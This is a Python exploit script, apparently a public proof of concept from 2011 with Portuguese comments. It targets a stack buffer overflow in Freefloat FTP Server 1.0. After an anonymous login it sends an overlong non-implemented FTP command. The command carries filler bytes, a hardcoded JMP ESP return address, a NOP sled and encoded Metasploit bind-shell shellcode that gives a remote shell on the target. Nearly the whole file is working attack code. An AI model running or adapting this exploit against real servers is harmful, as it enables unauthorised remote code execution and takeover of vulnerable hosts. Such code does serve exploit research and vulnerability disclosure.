#!/usr/bin/Python
# -*- coding: utf-8 -*-

# Title: Freefloat FTP 1.0 Non Implemented Command Buffer Overflows
# Author: Craig Freyman (@cd1zz)
# Date: July 19, 2011
# Tested on Windows XP SP3 English
# Part of FreeFloat pwn week
# Vendor Notified: 7-18-2011 (no response)
# Software Link: http://www.freefloat.com/sv/freefloat-ftp-server/freefloat-ftp-server.php

import socket
import sys
import time
import struct

# Se os parametros forem menor que 2 informa como chamar o script
if len(sys.argv) < 2:
    print("[-]Usage: %s <target addr> <command>\r" % (sys.argv[0]))
    print("[-]For example [filename.py 192.168.1.10 PWND] would do the trick.")
    print("[-]Other options: AUTH, APPE, ALLO, ACCT")
    sys.exit(0)

# Separa os paremetros em variaveis
target = sys.argv[1]
command = sys.argv[2]

# Se os parametros forem maior que 2 separa os parametros opcionais
if len(sys.argv) > 2:
    platform = sys.argv[2]

# ./msfpayload windows/shell_bind_tcp r | ./msfencode -e x86/shikata_ga_nai -b "\x00\xff\x0d\x0a\x3d\x20"
# [*] x86/shikata_ga_nai succeeded with size 368 (iteration=1)

# Variavel com hexadecimal para a criacao do metasploit
shellcode = (
    "\xbf\x5c\x2a\x11\xb3\xd9\xe5\xd9\x74\x24\xf4\x5d\x33\xc9"
    "\xb1\x56\x83\xc5\x04\x31\x7d\x0f\x03\x7d\x53\xc8\xe4\x4f"
    "\x83\x85\x07\xb0\x53\xf6\x8e\x55\x62\x24\xf4\x1e\xd6\xf8"
    "\x7e\x72\xda\x73\xd2\x67\x69\xf1\xfb\x88\xda\xbc\xdd\xa7"
    "\xdb\x70\xe2\x64\x1f\x12\x9e\x76\x73\xf4\x9f\xb8\x86\xf5"
    "\xd8\xa5\x68\xa7\xb1\xa2\xda\x58\xb5\xf7\xe6\x59\x19\x7c"
    "\x56\x22\x1c\x43\x22\x98\x1f\x94\x9a\x97\x68\x0c\x91\xf0"
    "\x48\x2d\x76\xe3\xb5\x64\xf3\xd0\x4e\x77\xd5\x28\xae\x49"
    "\x19\xe6\x91\x65\x94\xf6\xd6\x42\x46\x8d\x2c\xb1\xfb\x96"
    "\xf6\xcb\x27\x12\xeb\x6c\xac\x84\xcf\x8d\x61\x52\x9b\x82"
    "\xce\x10\xc3\x86\xd1\xf5\x7f\xb2\x5a\xf8\xaf\x32\x18\xdf"
    "\x6b\x1e\xfb\x7e\x2d\xfa\xaa\x7f\x2d\xa2\x13\xda\x25\x41"
    "\x40\x5c\x64\x0e\xa5\x53\x97\xce\xa1\xe4\xe4\xfc\x6e\x5f"
    "\x63\x4d\xe7\x79\x74\xb2\xd2\x3e\xea\x4d\xdc\x3e\x22\x8a"
    "\x88\x6e\x5c\x3b\xb0\xe4\x9c\xc4\x65\xaa\xcc\x6a\xd5\x0b"
    "\xbd\xca\x85\xe3\xd7\xc4\xfa\x14\xd8\x0e\x8d\x12\x16\x6a"
    "\xde\xf4\x5b\x8c\xf1\x58\xd5\x6a\x9b\x70\xb3\x25\x33\xb3"
    "\xe0\xfd\xa4\xcc\xc2\x51\x7d\x5b\x5a\xbc\xb9\x64\x5b\xea"
    "\xea\xc9\xf3\x7d\x78\x02\xc0\x9c\x7f\x0f\x60\xd6\xb8\xd8"
    "\xfa\x86\x0b\x78\xfa\x82\xfb\x19\x69\x49\xfb\x54\x92\xc6"
    "\xac\x31\x64\x1f\x38\xac\xdf\x89\x5e\x2d\xb9\xf2\xda\xea"
    "\x7a\xfc\xe3\x7f\xc6\xda\xf3\xb9\xc7\x66\xa7\x15\x9e\x30"
    "\x11\xd0\x48\xf3\xcb\x8a\x27\x5d\x9b\x4b\x04\x5e\xdd\x53"
    "\x41\x28\x01\xe5\x3c\x6d\x3e\xca\xa8\x79\x47\x36\x49\x85"
    "\x92\xf2\x79\xcc\xbe\x53\x12\x89\x2b\xe6\x7f\x2a\x86\x25"
    "\x86\xa9\x22\xd6\x7d\xb1\x47\xd3\x3a\x75\xb4\xa9\x53\x10"
    "\xba\x1e\x53\x31")

# 7C874413   FFE4             JMP ESP kernel32.dll
ret = struct.pack('<L', 0x7C874413)
padding = "\x90" * 150
crash = ("%s%s%s%s" % ("\x41" * 246, ret, padding, shellcode))

print("[*] Freefloat FTP 1.0 Any Non Implemented Command Buffer Overflow")
print("[*] Author: Craig Freyman (@cd1zz)")
print("[*] Connecting to %s" % (target))

# Cria um objeto de conexao via socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    # Conecta via socket de forma anonima
    s.connect((target, 21))
except:
    print("[-] Connection to %s failed!" % (target))
    sys.exit(0)

print("[*] Sending %s %s byte crash..." % (len(crash), command))

# Envia o comando para utilizar o usuario anonimo
s.send("USER anonymous".encode())
# Espera uma resposta de 1024 bytes
s.recv(1024)
# Envia o comando para utilizar a senha vazia
s.send("PASS ".encode())
# Espera uma resposta de 1024 bytes
s.recv(1024)
# Envia o comando para utilizar o comando alterado
s.send("{} {}".format(command, crash).encode())
# Espera 4 segundos
time.sleep(4)
